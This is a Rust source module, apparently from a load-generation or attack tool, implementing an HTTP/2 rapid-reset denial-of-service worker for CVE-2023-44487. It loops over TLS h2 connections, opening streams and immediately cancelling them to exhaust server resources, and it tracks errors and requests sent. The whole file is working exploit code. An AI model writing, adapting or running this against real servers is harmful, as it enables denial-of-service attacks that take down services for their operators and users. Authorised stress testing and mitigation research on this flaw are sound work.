//! HTTP/2 rapid-reset worker (L7) — CVE-2023-44487.
//!
//! Over a single h2 connection, open a stream (HEADERS) and immediately reset it
//! (RST_STREAM), as fast as the peer will grant stream capacity. Each open/reset
//! is nearly free for us but forces the server to allocate and tear down request
//! state, the asymmetry the CVE exploits. Requires TLS with ALPN `h2`.

use super::net::Target;
use super::{Governor, Metrics, Shutdown};
use std::sync::atomic::Ordering::Relaxed;
use std::sync::Arc;
use std::time::Duration;

pub async fn worker(
    idx: u32,
    target: Arc<Target>,
    metrics: Arc<Metrics>,
    gov: Arc<Governor>,
    shutdown: Arc<Shutdown>,
) {
    let mut down = shutdown.subscribe();
    let uri = format!("https://{}{}", target.host, target.path);

    loop {
        if *down.borrow() {
            return;
        }
        if !gov.active(idx) {
            tokio::select! {
                _ = down.changed() => {}
                _ = tokio::time::sleep(Duration::from_millis(100)) => {}
            }
            continue;
        }

        let io = match target.connect_h2().await {
            Ok(io) => io,
            Err(_) => {
                metrics.errors.fetch_add(1, Relaxed);
                tokio::select! {
                    _ = down.changed() => return,
                    _ = tokio::time::sleep(Duration::from_millis(50)) => {}
                }
                continue;
            }
        };

        let (mut send_req, connection) = match h2::client::handshake(io).await {
            Ok(pair) => pair,
            Err(_) => {
                metrics.errors.fetch_add(1, Relaxed);
                continue;
            }
        };
        // The connection future must be driven for the client to make progress.
        let conn_task = tokio::spawn(async move { let _ = connection.await; });

        // Rapid open/reset loop on this connection.
        'rr: loop {
            if *down.borrow() || !gov.active(idx) {
                break 'rr;
            }
            send_req = match send_req.ready().await {
                Ok(s) => s,
                Err(_) => {
                    metrics.errors.fetch_add(1, Relaxed);
                    break 'rr;
                }
            };
            let Ok(request) = http::Request::builder()
                .method(http::Method::GET)
                .uri(&uri)
                .body(())
            else {
                break 'rr;
            };
            match send_req.send_request(request, false) {
                Ok((resp, mut stream)) => {
                    stream.send_reset(h2::Reason::CANCEL);
                    drop(resp);
                    metrics.requests_sent.fetch_add(1, Relaxed);
                }
                Err(_) => {
                    metrics.errors.fetch_add(1, Relaxed);
                    break 'rr;
                }
            }
        }
        conn_task.abort();
    }
}
